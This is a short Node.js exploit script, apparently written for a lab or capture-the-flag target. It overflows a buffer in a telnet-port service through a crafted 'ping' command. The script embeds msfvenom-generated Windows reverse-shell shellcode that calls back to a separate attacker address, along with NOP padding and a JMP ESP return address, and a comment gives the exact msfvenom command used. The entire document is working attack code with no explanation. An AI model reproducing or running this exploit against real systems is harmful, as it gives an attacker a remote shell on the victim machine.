const client = new require('net').Socket();

// msfvenom -p windows/shell_reverse_tcp LHOST=172.19.98.159 LPORT=28080 -f hex -b '\x00\x0A\x0D\x08' -e x86/call4_dword_xor
const shellcode = '2bc983e9afe8ffffffffc05e81760ea4f4e48e83eefce2f4581c668ea4f4840741c524ea2fa4d405f6f86fdcb07f96a6ab43aea8950b48b2c588e6a284352b83a533067cf6a36fdcb47faeb22fb8f5f647bce55ff57fbdaea5276fc7bc17dec72fc06f8f72c51b22653be98f63cc04fb52f799769f89c0fb40ac6fd680f537e82ff8af05fce8e55d2ff06f8f747da0aa80afbfeffdaeb57144abbbd42fe60f03f99cd7bca4f48cf9d7c6bbdaccb893a8a30b313634f5e48e8d30b0deccdd64e5a40b31def4a4b4cef4b4b4e64efb3b6e5b2173e4a19c489dc66b8c8ca4995407429ef4d8f39c7d2bd0951b5b213490825bbaecfb489c143b06a21b5bcc9789eaa47d07d9f3a3d578cee6bdd846098249e0d0d88fa579a0aab432e4caf0a4b2d8f2b2b2c0f2a2b7d8cc8d28b1220b310744bab2c85bc48c8623e98471714f143b06a28c283149797171c8e2f2ae741f6ed1f15fc9b7868be4a4a71b5b';
const jmpESP = '\x17\x37\xe4\x76';
const padding = '\x90'.repeat(1008 - shellcode.length / 2);

const ping = `ping aaaa${Buffer.from(shellcode, 'hex').toString('latin1')}${padding}${jmpESP}${padding}\r\n`;

client.connect(23, '172.19.96.1', () => client.write(ping, 'latin1'));
